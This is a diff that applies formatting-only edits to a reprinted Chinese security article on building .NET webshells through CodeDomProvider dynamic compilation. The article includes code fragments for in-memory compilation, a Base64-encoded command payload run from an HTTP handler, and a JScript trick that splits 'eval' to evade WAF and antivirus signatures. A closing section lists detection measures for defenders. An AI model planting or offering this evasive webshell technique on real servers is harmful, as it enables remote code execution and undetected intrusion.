@@ -5,8 +5,8 @@ description: .Net可通过编译技术将外部输入的字符串作为代码执
 date: 2022-05-15 23:15:14
 copyright: Reprinted
 author: Ivan1ee dotNet安全矩阵
-originaltitle: 基于.NET动态编译技术实现任意代码执行
-originallink: https://mp.weixin.qq.com/s/eZgnxEihQu-KULLeLJatCw
+originalTitle: 基于.NET动态编译技术实现任意代码执行
+originalLink: https://mp.weixin.qq.com/s/eZgnxEihQu-KULLeLJatCw
 draft: False
 cover: https://img1.dotnet9.com/2022/05/cover44.gif
 categories: .NET
@@ -17,11 +17,11 @@ tags: 动态编译
 
 ## 一、前言
 
-当下主流的Waf或Windows Defender等终端杀软、EDR大多都是从特征码查杀，在.Net和VBS下一句话木马中最常见的特征是eval，对于攻击者来说需要避开这个系统关键字，可从反序列化方式避开eval，但公开已久相信很多安全产品已经能够很好检测和阻断这类攻击请求。笔者从.NET 内置的CodeDomProvider类下手实现动态编译.NET代码，指明JScrip或者C#作为编译语言，编译的WebShell目前`Windows Defender不会查杀`。而防御者从流量或终端识别 "CodeDomProvider.CreateProvider、CreateInstance"等特征码。
+当下主流的 Waf 或 Windows Defender 等终端杀软、EDR 大多都是从特征码查杀，在.Net 和 VBS 下一句话木马中最常见的特征是 eval，对于攻击者来说需要避开这个系统关键字，可从反序列化方式避开 eval，但公开已久相信很多安全产品已经能够很好检测和阻断这类攻击请求。笔者从.NET 内置的 CodeDomProvider 类下手实现动态编译.NET 代码，指明 JScrip 或者 C#作为编译语言，编译的 WebShell 目前`Windows Defender不会查杀`。而防御者从流量或终端识别 "CodeDomProvider.CreateProvider、CreateInstance"等特征码。
 
 ## 二、动态编译
 
-.Net可通过编译技术将外部输入的字符串作为代码执行，动态编译技术提供了最核心的两个类`CodeDomProvider` 和 `CompilerParameters`，前者相当于编译器，后者相当于编译器参数，CodeDomProvider支持多种语言（如C#、VB、Jscript），编译器参数CompilerParameters.GenerateExecutable默认表示生成dll，`GenerateInMemory= true`时表示在内存中加载，CompileAssemblyFromSource表示程序集的数据源，再将编译产生的结果生成程序集供反射调用。最后通过CreateInstance实例化对象并反射调用自定义类中的方法。
+.Net 可通过编译技术将外部输入的字符串作为代码执行，动态编译技术提供了最核心的两个类`CodeDomProvider` 和 `CompilerParameters`，前者相当于编译器，后者相当于编译器参数，CodeDomProvider 支持多种语言（如 C#、VB、Jscript），编译器参数 CompilerParameters.GenerateExecutable 默认表示生成 dll，`GenerateInMemory= true`时表示在内存中加载，CompileAssemblyFromSource 表示程序集的数据源，再将编译产生的结果生成程序集供反射调用。最后通过 CreateInstance 实例化对象并反射调用自定义类中的方法。
 
 ```csharp
 CodeDomProvider compiler = CodeDomProvider.CreateProvider("C#"); ;     //编译器
@@ -38,7 +38,7 @@ var result = objMifo.Invoke(objInstance, null);
 
 ## 三、落地实现
 
-上述代码里的SourceText方法需提供编译的C#源代码，笔者创建了NeteyeInput类，如下
+上述代码里的 SourceText 方法需提供编译的 C#源代码，笔者创建了 NeteyeInput 类，如下
 
 ```csharp
 public static string SourceText(string txt)
@@ -70,13 +70,13 @@ public static string SourceText(string txt)
 }
 ```
 
-类里声明了OutPut方法，该方法里通过Base64解码得到输入的原生字符串，笔者在这里以计算器作为演示，将`“System.Diagnostics.Process.Start("cmd.exe","/c calc");”`编码为
+类里声明了 OutPut 方法，该方法里通过 Base64 解码得到输入的原生字符串，笔者在这里以计算器作为演示，将`“System.Diagnostics.Process.Start("cmd.exe","/c calc");”`编码为
 
 ```shell
 U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuU3RhcnQoImNtZC5leGUiLCIvYyBjYWxjIik7
 ```
 
-最后在一般处理程序ProcessRequest方法中调用
+最后在一般处理程序 ProcessRequest 方法中调用
 
 ```csharp
 public void ProcessRequest(HttpContext context)
@@ -98,9 +98,9 @@ public void ProcessRequest(HttpContext context)
 
 ## 四、其他方法
 
-Jscript.Net 动态编译拆解eval
+Jscript.Net 动态编译拆解 eval
 
-在.NET安全领域中一句话木马主流的都是交给eval关键词执行，而很多安全产品都会对此重点查杀，所以笔者需要`避开eval`，而在.NET中eval只存在于Jscript.Net，所以需要将动态编译器指定为Jscript，其余和C#版本的动态编译基本一致，笔者通过插入无关字符将eval拆解掉，代码如下
+在.NET 安全领域中一句话木马主流的都是交给 eval 关键词执行，而很多安全产品都会对此重点查杀，所以笔者需要`避开eval`，而在.NET 中 eval 只存在于 Jscript.Net，所以需要将动态编译器指定为 Jscript，其余和 C#版本的动态编译基本一致，笔者通过插入无关字符将 eval 拆解掉，代码如下
 
 ```csharp
 private static readonly string _jscriptClassText =
@@ -114,7 +114,7 @@ private static readonly string _jscriptClassText =
             }";
 ```
 
-只需在编译的时候替换掉无关字符串“/*@Ivan1ee@*/”，最后编译后反射执行目标方法。
+只需在编译的时候替换掉无关字符串“/_@Ivan1ee@_/”，最后编译后反射执行目标方法。
 
 ```csharp
 CompilerResults results = compiler.CompileAssemblyFromSource(parameters, _jscriptClassText.Replace("/*@Ivan1ee@*/",""));
@@ -122,8 +122,8 @@ CompilerResults results = compiler.CompileAssemblyFromSource(parameters, _jscrip
 
 ## 五、防御措施
 
-- 一般web应用使用场景不多，检测特征码：CodeDomProvider.CreateProvider、CreateInstance等等，一旦告警需格外关注；
+- 一般 web 应用使用场景不多，检测特征码：CodeDomProvider.CreateProvider、CreateInstance 等等，一旦告警需格外关注；
 
-- 由于编译生成的程序集以临时文件保存在硬盘，需加入对可写目录下dll文件内容的监控；
+- 由于编译生成的程序集以临时文件保存在硬盘，需加入对可写目录下 dll 文件内容的监控；
 
 - 文章涉及的代码已经打包在: [https://github.com/Ivan1ee/.NETWebShell](https://github.com/Ivan1ee/.NETWebShell)
